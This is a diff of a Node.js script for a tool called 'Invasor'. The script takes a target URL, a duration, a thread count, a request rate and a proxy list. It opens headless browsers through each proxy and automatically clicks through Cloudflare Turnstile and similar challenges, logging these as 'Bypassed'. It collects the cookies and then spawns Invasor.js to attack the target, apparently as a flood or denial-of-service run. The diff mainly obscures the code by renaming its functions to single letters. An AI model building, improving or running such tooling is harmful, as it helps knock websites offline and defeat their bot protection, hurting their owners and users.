@@ -21,49 +21,30 @@ const c = {
   cyan:    "\x1b[36m",
   white:   "\x1b[37m",
   gray:    "\x1b[90m",
-  orange:  "\x1b[38;2;255;140;50m",
+  steel:   "\x1b[38;2;180;190;205m",
 };
 
-// [Invasor@Browser] prefix - brackets & @ gray, Invasor & Browser deep warm orange
-const PREFIX = `${c.gray}[${c.orange}Invasor${c.gray}@${c.orange}Browser${c.gray}]${c.reset} `;
+const PREFIX = `${c.gray}[${c.steel}Invasor${c.gray}@${c.steel}Browser${c.gray}]${c.reset} `;
 
-const symbols = {
-  info:    ">",
-  success: ">",
-  warn:    ">",
-  error:   ">",
-  proxy:   ">",
-  pink:    ">",
-};
-
-function log(type, text) {
-  const symbol = symbols[type] || ">";
-  let color = c.white;
-
-  if (type === "error") color = c.red;
-  if (type === "success") color = c.green;
-  if (type === "warn") color = c.yellow;
-  if (type === "info" || type === "proxy") color = c.orange;
-  if (type === "pink") color = c.pink;
-
-  console.log(`${PREFIX}${color}${symbol} ${text}${c.reset}`);
+function a(type, text) {
+  console.log(`${PREFIX}${c.gray}&${c.reset} ${c.white}${text}${c.reset}`);
 }
 
 // ────────────────────────────────────────────────
 // Startup banner
 // ────────────────────────────────────────────────
-function showBanner() {
+function b() {
   console.log(`${c.gray}>${c.reset} ${c.white}i hope you find some peace of mind${c.reset}`);
   console.log(`${c.gray}>${c.reset} ${c.white}i hope you find some paradise${c.reset}`);
   console.log();
 }
 
-const errorHandler = error => log("error", error);
-process.on("uncaughtException", errorHandler);
-process.on("unhandledRejection", errorHandler);
+const d = error => a("error", error);
+process.on("uncaughtException", d);
+process.on("unhandledRejection", d);
 
 if (process.argv.length < 7) {
-  log("error", "Usage: node browser.js <target> <time> <threads> <rate> <proxies.txt>");
+  a("error", "Usage: node browser.js <target> <time> <threads> <rate> <proxies.txt>");
   process.exit(1);
 }
 
@@ -73,21 +54,21 @@ const threads = parseInt(process.argv[4], 10);
 const rates = process.argv[5];
 const proxyFile = process.argv[6];
 
-const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
+const e = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
 
-const readProxiesFromFile = (filePath) => {
+const f = (filePath) => {
   try {
     const data = fs.readFileSync(filePath, 'utf8');
     return data.trim().split(/\r?\n/);
   } catch (error) {
-    log("error", `Error reading proxies file: ${error}`);
+    a("error", `Error reading proxies file: ${error}`);
     return [];
   }
 };
 
-const proxies = readProxiesFromFile(proxyFile);
+const proxies = f(proxyFile);
 
-const userAgents = () => {
+const g = () => {
   const chromeVersions = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
@@ -99,7 +80,7 @@ const userAgents = () => {
   return chromeVersions[Math.floor(Math.random() * chromeVersions.length)];
 };
 
-async function detectChallenge(page, browserProxy) {
+async function h(page, browserProxy) {
   const content = await page.content();
 
   // Cloudflare Turnstile challenge detection (2024-2026)
@@ -117,9 +98,9 @@ async function detectChallenge(page, browserProxy) {
 
   if (isTurnstile || isLegacyChallenge || isManagedChallenge) {
     const challengeType = isTurnstile ? "Turnstile" : isLegacyChallenge ? "Legacy" : "Managed";
-    log("pink", `Detected ${challengeType} challenge → ${browserProxy}`);
+    a("pink", `Detected ${challengeType} challenge → ${browserProxy}`);
     try {
-      await sleep(5);
+      await e(5);
 
       // Try Turnstile checkbox (iframe-based)
       const turnstileFrame = page.frames().find(f =>
@@ -127,17 +108,17 @@ async function detectChallenge(page, browserProxy) {
       );
 
       if (turnstileFrame) {
-        log("info", `Found Turnstile frame → ${browserProxy}`);
+        a("info", `Found Turnstile frame → ${browserProxy}`);
         try {
           await turnstileFrame.waitForSelector('input[type="checkbox"], .cb-lb, #challenge-stage', { timeout: 15000 });
           const checkbox = await turnstileFrame.$('input[type="checkbox"], .cb-lb');
           if (checkbox) {
-            await sleep(2);
+            await e(2);
             await checkbox.click();
-            log("info", `Clicked Turnstile checkbox → ${browserProxy}`);
+            a("info", `Clicked Turnstile checkbox → ${browserProxy}`);
           }
         } catch (e) {
-          log("warn", `Turnstile frame interaction failed: ${e.message}`);
+          a("warn", `Turnstile frame interaction failed: ${e.message}`);
         }
       }
 
@@ -158,18 +139,18 @@ async function detectChallenge(page, browserProxy) {
       }
 
       // Wait for challenge to resolve
-      await sleep(10);
+      await e(10);
     } catch (error) {
-      log("error", `Error in challenge detection: ${error.message}`);
+      a("error", `Error in challenge detection: ${error.message}`);
     }
   } else {
-    log("warn", `No challenge detected → ${browserProxy}`);
-    await sleep(3);
+    a("warn", `No challenge detected → ${browserProxy}`);
+    await e(3);
   }
 }
 
-async function openBrowser(targetURL, browserProxy) {
-  const userAgent = userAgents();
+async function i(targetURL, browserProxy) {
+  const userAgent = g();
   const [proxyHost, proxyPort] = browserProxy.split(":");
   let browser;
   try {
@@ -197,7 +178,7 @@ async function openBrowser(targetURL, browserProxy) {
 
     page.setDefaultNavigationTimeout(60 * 1000);
     await page.goto(targetURL, { waitUntil: "domcontentloaded" });
-    await detectChallenge(page, browserProxy);
+    await h(page, browserProxy);
 
     const title = await page.title();
     const cookies = await page.cookies(targetURL);
@@ -210,13 +191,13 @@ async function openBrowser(targetURL, browserProxy) {
       userAgent
     };
   } catch (error) {
-    log("error", `Error in openBrowser: ${error.message}`);
+    a("error", `Error in i: ${error.message}`);
     if (browser) await browser.close();
     return null;
   }
 }
 
-async function startThread(targetURL, browserProxy, task, done, retries = 0) {
+async function j(targetURL, browserProxy, task, done, retries = 0) {
   if (retries >= COOKIES_MAX_RETRIES) {
     const currentTask = queue.length();
     done(null, { task, currentTask });
@@ -224,7 +205,7 @@ async function startThread(targetURL, browserProxy, task, done, retries = 0) {
   }
   let browser = null;
   try {
-    const response = await openBrowser(targetURL, browserProxy);
+    const response = await i(targetURL, browserProxy);
     if (!response) {
       throw new Error("Failed to open browser or retrieve response");
     }
@@ -240,14 +221,14 @@ async function startThread(targetURL, browserProxy, task, done, retries = 0) {
     ];
 
     if (failTitles.some(t => response.title.includes(t))) {
-      log("error", `Proxy Issue → ${response.title} - Proxy: ${response.browserProxy}`);
+      a("error", `Proxy Issue → ${response.title} - Proxy: ${response.browserProxy}`);
       if (browser) await browser.close();
       done(null, { task, currentTask: queue.length() });
       return;
     }
 
-    log("success", `Bypassed → ${response.title} | ${response.browserProxy}`);
-    log("success", `Cookies → ${response.cookies}`);
+    a("success", `Bypassed → ${response.title} | ${response.browserProxy}`);
+    a("success", `Cookies → ${response.cookies}`);
 
     spawn("node", [
       "Invasor.js",
@@ -263,39 +244,39 @@ async function startThread(targetURL, browserProxy, task, done, retries = 0) {
     if (browser) await browser.close();
     done(null, { task, currentTask: queue.length() });
   } catch (error) {
-    log("error", `Error in startThread: ${error.message}`);
+    a("error", `Error in j: ${error.message}`);
     if (browser) await browser.close();
-    await startThread(targetURL, browserProxy, task, done, retries + 1);
+    await j(targetURL, browserProxy, task, done, retries + 1);
   }
 }
 
 const queue = async.queue(function (task, done) {
-  startThread(targetURL, task.browserProxy, task, done);
+  j(targetURL, task.browserProxy, task, done);
 }, threads);
 
-async function main() {
-  showBanner();
-  log("info", `Starting Browser`);
-  log("info", `Target: ${targetURL}`);
-  log("info", `Proxies: ${proxies.length} | Threads: ${threads} | Duration: ${duration}s`);
+async function k() {
+  b();
+  a("info", `Starting Browser`);
+  a("info", `Target: ${targetURL}`);
+  a("info", `Proxies: ${proxies.length} | Threads: ${threads} | Duration: ${duration}s`);
   console.log();
 
   for (const browserProxy of proxies) {
     queue.push({ browserProxy });
   }
 
-  await sleep(duration);
+  await e(duration);
 
   exec('pkill -f Invasor.js', (err) => {
-    if (err) log("error", `Error killing Invasor.js: ${err.message}`);
+    if (err) a("error", `Error killing Invasor.js: ${err.message}`);
   });
   exec('pkill chrome', (err) => {
-    if (err) log("error", `Error killing chrome: ${err.message}`);
+    if (err) a("error", `Error killing chrome: ${err.message}`);
   });
   exec('pkill chromium', (err) => {
-    if (err) log("error", `Error killing chromium: ${err.message}`);
+    if (err) a("error", `Error killing chromium: ${err.message}`);
   });
   process.exit();
 }
 
-main();
+k();
